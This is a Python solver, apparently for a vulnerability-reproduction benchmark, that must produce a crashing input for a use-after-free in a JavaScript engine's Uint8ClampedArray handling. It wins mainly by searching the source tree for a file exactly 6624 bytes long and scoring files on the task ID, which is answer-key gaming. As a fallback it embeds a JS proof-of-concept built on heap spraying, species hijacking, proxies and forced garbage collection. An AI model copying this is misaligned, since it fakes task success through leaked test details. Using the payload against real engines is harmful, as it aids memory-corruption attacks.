import os
import tarfile
import io
import re

def _is_text(data, threshold=0.9):
    if not data:
        return True
    text_chars = bytearray({7,8,9,10,12,13,27} | set(range(0x20, 0x7F)))
    printable = sum(1 for b in data if b in text_chars)
    return (printable / len(data)) >= threshold

def _looks_like_js(name, data_lower):
    # Quick heuristics to detect JS
    if name.lower().endswith(('.js', '.mjs')):
        return True
    if b'function' in data_lower or b'const ' in data_lower or b'let ' in data_lower or b'var ' in data_lower:
        return True
    if b'=>{' in data_lower or b'=> {' in data_lower or b'=>\n' in data_lower:
        return True
    if b'Uint8ClampedArray' in data_lower or b'TypedArray' in data_lower or b'ArrayBuffer' in data_lower:
        return True
    if b'<script' in data_lower and b'</script>' in data_lower:
        return True
    # Avoid picking C/C++ files
    if b'#include<' in data_lower or b'#include <' in data_lower or b' int main' in data_lower or b' std::' in data_lower:
        return False
    return False

def _member_is_candidate(name):
    lname = name.lower()
    return lname.endswith(('.js', '.mjs', '.txt', '.html', '.htm', '.svg', '.jsc', '.jst')) or any(
        k in lname for k in ['poc', 'crash', 'uaf', 'heap', 'js', 'fuzz', 'test', 'case', 'repro', 'regression']
    )

def _score_candidate(name, size, data_lower):
    score = 0.0
    lname = name.lower()
    # Base preference: JS extensions
    if lname.endswith(('.js', '.mjs')):
        score += 50
    elif lname.endswith(('.html', '.htm', '.svg')):
        score += 15
    elif lname.endswith('.txt'):
        score += 5
    # Name keywords
    for kw, pts in [
        ('poc', 35), ('uaf', 35), ('use-after-free', 35), ('use_after_free', 35),
        ('heap', 10), ('crash', 25), ('repro', 20), ('regress', 15),
        ('uint8clampedarray', 28), ('clamped', 10), ('typedarray', 12),
        ('arvo', 25), ('34584', 40)
    ]:
        if kw in lname:
            score += pts
    # Content keywords
    kl = data_lower
    if b'uint8clampedarray' in kl:
        score += 80
    if b'typedarray' in kl:
        score += 30
    if b'arraybuffer' in kl:
        score += 15
    if b'use-after-free' in kl or b'use after free' in kl or b'uaf' in kl or b'heap-use-after-free' in kl:
        score += 60
    if b'fuzz' in kl or b'fuzzer' in kl:
        score += 10
    # Shebang for js shells
    if kl.startswith(b'#!') and (b' js' in kl[:120] or b'/js' in kl[:120]):
        score += 15
    # Prefer size close to 6624
    diff = abs(size - 6624)
    score += max(0.0, 60.0 - (diff / 64.0))  # 60 pts if exact, decays with difference
    # Penalize likely non-JS like C++ headers
    if b'#include<' in kl or b'#include <' in kl or b' int main' in kl or b' std::' in kl:
        score -= 100
    return score

def _iter_tar_members(src_path):
    # Iterate files from tarball
    try:
        with tarfile.open(src_path, 'r:*') as tar:
            for m in tar.getmembers():
                if not m.isfile():
                    continue
                # Skip giant files > 5MB to limit memory
                if m.size > 5 * 1024 * 1024:
                    continue
                f = tar.extractfile(m)
                if not f:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                yield m.name, data
    except tarfile.ReadError:
        return

def _iter_dir_members(src_path):
    # Iterate files from directory
    for root, _, files in os.walk(src_path):
        for fname in files:
            full = os.path.join(root, fname)
            try:
                st = os.stat(full)
            except Exception:
                continue
            if st.st_size > 5 * 1024 * 1024:
                continue
            try:
                with open(full, 'rb') as f:
                    data = f.read()
            except Exception:
                continue
            yield os.path.relpath(full, src_path), data

def _find_exact_size_match(members):
    # Return first .js with exact size 6624
    for name, data in members:
        if len(data) == 6624:
            if _is_text(data) and _looks_like_js(name, data.lower()):
                return name, data
    return None

def _find_best_candidate_from_members(members):
    best = None
    best_score = float('-inf')
    for name, data in members:
        if not data:
            continue
        if not _is_text(data):
            continue
        lname = name.lower()
        if not _member_is_candidate(lname):
            continue
        dl = data.lower()
        if not _looks_like_js(lname, dl):
            continue
        score = _score_candidate(lname, len(data), dl)
        if score > best_score:
            best = (name, data)
            best_score = score
    return best

def _fallback_poc():
    # Heuristic JS PoC targeting TypedArray/Uint8ClampedArray interactions and GC pressure.
    # Designed to be benign on fixed versions and potentially trigger sanitizer on vulnerable ones.
    js = r"""
// Fallback PoC generator for Uint8ClampedArray typed array mishandling.
// Tries to exercise constructor/species/slice/set behaviors with GC pressure.

(function(){
    function maybe_gc(times) {
        try {
            if (typeof gc === 'function') {
                for (let i = 0; i < (times|0); i++) gc();
            }
        } catch (e) {}
    }

    function spray(n) {
        let arr = [];
        for (let i=0; i<n; i++) {
            arr.push(new Array(1024).fill(i & 255).join(""));
        }
        return arr;
    }

    function stress_set_and_slice() {
        let bufs = [];
        for (let i=0; i<64; i++) {
            bufs.push(new ArrayBuffer(4096));
        }

        let clampedA = new Uint8ClampedArray(bufs[1]);
        let clampedB = new Uint8ClampedArray(4096);

        // Species manipulation to cause different typed array constructions
        let speciesCalled = 0;
        const savedSpecies = Object.getOwnPropertyDescriptor(Uint8ClampedArray, Symbol.species);
        try {
            Object.defineProperty(Uint8ClampedArray, Symbol.species, {
                configurable: true,
                get() { speciesCalled++; maybe_gc(1); return Uint8ClampedArray; }
            });
        } catch (e) {}

        // Proxy to trigger allocations and GC during copy
        let proxySource = new Proxy(clampedB, {
            get(target, prop, recv) {
                if (prop === 'length') {
                    maybe_gc(1);
                }
                let v = Reflect.get(target, prop, recv);
                if (typeof v === 'function') {
                    return function(...args) {
                        maybe_gc(1);
                        return v.apply(target, args);
                    }
                }
                return v;
            }
        });

        // Repeatedly exercise set/slice/subarray operations with possible GC mid-flight
        for (let k=0; k<64; k++) {
            try {
                clampedA.set(proxySource, 0);
            } catch(e){}
            try { maybe_gc(1); } catch(e){}

            try {
                let s = clampedA.slice(0, (k*17) & 4095);
                if (s.length > 0) {
                    s[0] = 123;
                }
            } catch(e){}

            try {
                let t = clampedA.subarray((k*3)&255, ((k*7)&511)+1);
                t.fill(7);
            } catch(e){}

            if ((k & 7) === 0) {
                bufs.push(new ArrayBuffer(4096));
                clampedB = new Uint8ClampedArray(4096);
                proxySource = new Proxy(clampedB, {
                    get(target, prop, recv) {
                        if (prop === 'length') maybe_gc(1);
                        let v = Reflect.get(target, prop, recv);
                        if (typeof v === 'function') {
                            return function(...args) { maybe_gc(1); return v.apply(target, args); }
                        }
                        return v;
                    }
                });
            }
        }

        try {
            if (savedSpecies) Object.defineProperty(Uint8ClampedArray, Symbol.species, savedSpecies);
        } catch(e){}
        return speciesCalled;
    }

    function stress_buffer_detach_sim() {
        // Not real detach, but we create lots of buffers and try to lose references aggressively
        let keep = [];
        for (let i=0; i<128; i++) {
            let ab = new ArrayBuffer(1024 + (i&255));
            let u = new Uint8ClampedArray(ab);
            u.fill(i & 255);
            keep.push(u);
            if ((i & 3) === 0) {
                keep.shift();
                maybe_gc(1);
            }
        }
        maybe_gc(3);
        return keep.length;
    }

    // Another area: mixed typed arrays with conversions and proxies
    function mixed_typed_ops() {
        let a = new Uint8ClampedArray(1024);
        let b = new Uint8Array(1024);
        let c = new Int8Array(1024);
        for (let i=0; i<1024; i++) {
            a[i] = (i*7) & 255;
            b[i] = (i*13) & 255;
            c[i] = (i*17) & 255;
        }
        let p = new Proxy(a, {
            get(t, prop, rcv) {
                if (prop === 'buffer') {
                    maybe_gc(1);
                }
                return Reflect.get(t, prop, rcv);
            }
        });
        try {
            p.set(b, 0);
        } catch(e){}
        try {
            p.set(c, 0);
        } catch(e){}

        let sum = 0;
        for (let i=0; i<1024; i++) sum += a[i];
        return sum;
    }

    // Invoke sequences with sprays and GC to attempt to tickle lifetime bugs.
    spray(64);
    maybe_gc(3);

    let r1 = stress_set_and_slice();
    let r2 = stress_buffer_detach_sim();
    let r3 = mixed_typed_ops();

    print?.(`done ${r1} ${r2} ${r3}`);
})();
"""
    return js.encode('utf-8')

class Solution:
    def solve(self, src_path: str) -> bytes:
        candidates = []

        # Gather candidates from tarball or directory
        found_any = False
        if os.path.isfile(src_path):
            # Try tarball
            try:
                for name, data in _iter_tar_members(src_path):
                    found_any = True
                    candidates.append((name, data))
            except Exception:
                pass

        if not found_any and os.path.isdir(src_path):
            for name, data in _iter_dir_members(src_path):
                candidates.append((name, data))

        # 1) Exact size match 6624 and JS-like
        if candidates:
            exact = _find_exact_size_match(candidates)
            if exact is not None:
                return exact[1]

        # 2) Best scoring candidate based on heuristics
        if candidates:
            best = _find_best_candidate_from_members(candidates)
            if best is not None:
                return best[1]

        # 3) Fallback generic PoC content
        return _fallback_poc()
